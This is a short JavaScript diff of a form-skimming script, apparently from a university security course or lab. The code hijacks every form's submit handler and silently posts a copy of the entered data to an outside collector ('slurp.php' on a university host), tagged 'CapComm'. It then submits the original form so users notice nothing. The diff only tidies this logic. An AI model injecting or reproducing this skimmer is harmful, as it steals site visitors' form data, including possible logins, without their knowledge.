@@ -6,7 +6,6 @@ for (const form of forms) {
   form.onsubmit = function (event) {
     event.preventDefault();
     const newForm = form.cloneNode(true);
-    const oldForm = form.cloneNode(true);
     newForm.action = "http://treeforty.csse.rose-hulman.edu/f/slurp.php";
     const input = document.createElement("input");
     input.type = "hidden";
@@ -14,6 +13,6 @@ for (const form of forms) {
     input.value = "CapComm";
     newForm.appendChild(input);
     newForm.submit();
-    oldForm.submit();
+    form.submit();
   };
 }
